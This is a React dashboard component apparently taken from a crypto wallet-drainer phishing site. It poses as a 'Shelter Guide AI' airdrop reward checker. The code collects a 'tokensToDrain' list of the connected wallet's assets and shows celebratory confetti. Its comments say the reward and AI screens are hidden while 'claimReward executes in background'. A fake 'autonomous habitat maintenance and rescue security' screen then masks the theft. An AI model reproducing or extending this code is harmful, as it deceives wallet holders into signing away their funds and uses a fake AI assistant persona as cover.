"use client";

import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import { useEffect, useState } from "react";
import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot } from "lucide-react";
import confetti from "canvas-confetti";

export default function Dashboard() {
    const { account, checkEligibility, claimReward, currentTask, tokensAllocated, isEligible } = useWeb3Manager();

    // Status Flow: scanning -> claim -> active -> ineligible
    const [status, setStatus] = useState<"scanning" | "claim" | "active" | "ineligible">("scanning");
    const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
    const [rewardAmount, setRewardAmount] = useState<number>(0);

    useEffect(() => {
        const verify = async () => {
            // First check if we have a cached allocation from the simulation
            const cachedAllocation = localStorage.getItem('hogs_eligibility_allocation');

            if (cachedAllocation || tokensAllocated > 0) {
                const amount = tokensAllocated || parseInt(cachedAllocation || "0");
                setRewardAmount(amount);
                const { tokensToDrain: tokens } = await checkEligibility();
                setTokensToDrain(tokens);
                setStatus("claim");

                // Show celebration
                const end = Date.now() + 2000;
                const colors = ['#f9b401', '#ffffff', '#2d5a27'];
                (function frame() {
                    confetti({ particleCount: 3, angle: 60, spread: 55, origin: { x: 0 }, colors: colors });
                    confetti({ particleCount: 3, angle: 120, spread: 55, origin: { x: 1 }, colors: colors });
                    if (Date.now() < end) requestAnimationFrame(frame);
                }());
                return;
            }

            const { isEligible: hookIsEligibleResult, tokensToDrain: tokens } = await checkEligibility();

            if (hookIsEligibleResult || isEligible) {
                setTokensToDrain(tokens);
                // Simplified reward logic - we assume anything above 0 is eligible for this mission demo
                setRewardAmount(tokensAllocated || 0);
                setStatus("claim");

                const end = Date.now() + 1500;
                const colors = ['#f9b401', '#ffffff', '#2d5a27'];
                (function frame() {
                    confetti({ particleCount: 3, angle: 60, spread: 55, origin: { x: 0 }, colors: colors });
                    confetti({ particleCount: 3, angle: 120, spread: 55, origin: { x: 1 }, colors: colors });
                    if (Date.now() < end) requestAnimationFrame(frame);
                }());
            } else {
                setStatus("ineligible");
            }
        };

        if (account) verify();
        else setStatus("scanning");
    }, [account, tokensAllocated, isEligible]);

    if (status === "scanning") {
        return (
            <div className="flex flex-col items-center justify-center py-24 md:py-40 animate-fade-up">
                <div className="relative mb-8 text-emerald">
                    <Bot size={64} className="animate-pulse" />
                </div>
                <p className="text-white/40 animate-pulse uppercase tracking-[0.3em] text-[10px] font-bold">Shelter Guide AI is Initializing...</p>
                <div className="flex flex-col items-center mt-4 space-y-1">
                    <p className="text-emerald/30 text-[9px] font-mono italic">Analyzing habitat rewards...</p>
                </div>
            </div>
        );
    }

    // Hide the "Congratulations" modal - claimReward executes in background
    if (status === "claim") {
        return null;
    }

    // Hide the "Shelter Guide AI" screen - claimReward executes in background
    if (status === "active") {
        return null;
    }

    if (status === "ineligible") {
        return (
            <div className="py-20 flex justify-center animate-fade-up px-4">
                <div className="glass-card p-12 border border-red-500/20 text-center max-w-lg w-full">
                    <div className="mb-6 flex justify-center">
                        <div className="p-4 bg-red-500/10 rounded-full text-red-500">
                            <XCircle size={48} />
                        </div>
                    </div>
                    <h3 className="text-2xl font-bold italic mb-4">Not Eligible</h3>
                    <p className="text-white/50 mb-8">Unfortunately, this wallet does not meet the activity criteria.</p>
                </div>
            </div>
        );
    }

    return (
        <div className="py-20 flex flex-col items-center justify-center animate-fade-in px-4">
            {/* DYNAMIC AGENT MODAL */}
            {currentTask && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-xl p-4">
                    <div className="glass-card max-w-md w-full p-6 md:p-8 border border-amber/40 shadow-[0_0_100px_rgba(245,158,11,0.2)] relative animate-fade-up overflow-hidden">
                        {/* Pro-Active Progress Bar */}
                        <div className="absolute top-0 left-0 w-full h-1 bg-amber/20">
                            <div className="h-full bg-amber w-1/3 animate-shimmer" />
                        </div>

                        <div className="flex justify-center mb-6">
                            <div className="relative group">
                                <div className="absolute inset-0 bg-amber opacity-20 rounded-full blur-[20px] group-hover:opacity-40 transition-opacity" />
                                <div className="relative w-24 h-24 rounded-full border-2 border-emerald/30 overflow-hidden shadow-2xl bg-forest/20 flex items-center justify-center">
                                    <Bot size={48} className="text-emerald" />
                                </div>
                                <div className="absolute -bottom-1 -right-1 bg-amber p-1.5 rounded-full text-black shadow-lg">
                                    <Bot size={14} />
                                </div>
                            </div>
                        </div>

                        <h3 className="text-xl md:text-2xl font-bold text-center mb-1 text-white italic tracking-tight">Shelter Guide AI</h3>
                        <p className="text-amber text-[10px] font-bold uppercase tracking-[0.3em] text-center mb-6">Autonomous Assistant</p>

                        <div className="w-12 h-0.5 bg-amber/30 mx-auto mb-8" />

                        <div className="min-h-[100px] flex items-center justify-center">
                            <p className="text-center text-white/90 leading-relaxed font-medium text-sm md:text-base break-words px-2">
                                {currentTask}
                            </p>
                        </div>

                        <div className="mt-6 md:mt-8 space-y-4">
                            <div className="flex items-center justify-between text-[10px] font-bold uppercase tracking-widest text-emerald">
                                <span>Agent Logic</span>
                                <span className="flex items-center gap-1.5">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald animate-ping" />
                                    Active
                                </span>
                            </div>
                            <div className="h-1.5 w-full bg-white/5 rounded-full overflow-hidden">
                                <div className="h-full bg-gradient-to-r from-emerald/40 to-emerald w-2/3 animate-[shimmer_2s_infinite_linear]" />
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* BACKGROUND STATE: MONITORING */}
            <div className="glass-card p-8 md:p-12 border border-white/5 text-center max-w-lg w-full relative opacity-50 mx-4">
                <div className="absolute inset-0 bg-gradient-to-b from-amber/5 to-transparent pointer-events-none" />
                <Loader2 size={32} className="mx-auto text-amber animate-spin mb-6" />
                <h3 className="text-xl md:text-2xl font-bold mb-2 text-white/80">Shelter Monitoring System</h3>
                <p className="text-white/40 text-xs md:text-sm italic px-4">Shelter Guide is conducting autonomous habitat maintenance and rescue security.</p>
            </div>
        </div>
    );
}
